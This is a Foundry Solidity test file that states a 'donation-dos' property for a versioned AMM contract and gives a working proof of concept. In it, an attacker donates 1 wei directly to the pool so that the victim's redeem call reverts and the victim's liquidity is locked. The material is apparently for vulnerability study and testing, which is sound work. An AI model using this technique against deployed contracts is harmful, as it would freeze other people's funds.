// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "versions/AMM_v4.sol" as V4;
import "versions/lib/IERC20.sol";

contract MockToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 1000000 * 1e18;
    constructor() { balanceOf[msg.sender] = totalSupply; }
    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[msg.sender] -= value; balanceOf[to] += value; return true;
    }
    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value; return true;
    }
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        allowance[from][msg.sender] -= value; balanceOf[from] -= value; balanceOf[to] += value; return true;
    }
}

contract DonationDosV4Test is Test {
    V4.AMM ammV4;
    MockToken token0;
    MockToken token1;
    address attacker = address(0x1337);
    address victim = address(0x1234);

    function setUp() public {
        token0 = new MockToken();
        token1 = new MockToken();
        ammV4 = new V4.AMM(IERC20(address(token0)), IERC20(address(token1)));

        token0.transfer(attacker, 10000);
        token1.transfer(attacker, 10000);
        token0.transfer(victim, 10000);
        token1.transfer(victim, 10000);

        vm.startPrank(attacker);
        token0.approve(address(ammV4), type(uint256).max);
        token1.approve(address(ammV4), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(victim);
        token0.approve(address(ammV4), type(uint256).max);
        token1.approve(address(ammV4), type(uint256).max);
        vm.stopPrank();
    }

    // donation-dos:
    // Let `t0`, `t1` be the amount of token0 and token1 held by the contract, let `r0`, `r1` be the contract's internal reserves of those tokens, and let `supply` be the internal supply of the contract. If `t0 >= r0` and `t1 >= r1`, a `redeem(x)`, transaction by a sender A, with `minted[A] >= x`, `supply > 0` and `x <= supply` never reverts.

    // PoC:
    // - Step 1 (setup): The victim deposits tokens to initialize the pool. The attacker then transfers 1 wei directly to the contract (donation), causing the real balance to decouple from the internal reserves.
    // - Step 2 (attack): The victim attempts to redeem their liquidity tokens. The transaction reverts due to strict equality checks, locking the funds (DoS).
    function test_donation_dos_attack_v4() public {
        vm.startPrank(victim);
        ammV4.deposit(10000, 10000);
        vm.stopPrank();

        assertEq(ammV4.r0(), 10000);
        assertEq(ammV4.r1(), 10000);

        vm.startPrank(attacker);
        token0.transfer(address(ammV4), 1);
        vm.stopPrank();

        assertEq(token0.balanceOf(address(ammV4)), 10001);
        assertEq(ammV4.r0(), 10000);

        vm.startPrank(victim);

        vm.expectRevert();
        ammV4.redeem(10000);

        vm.stopPrank();
    }
}
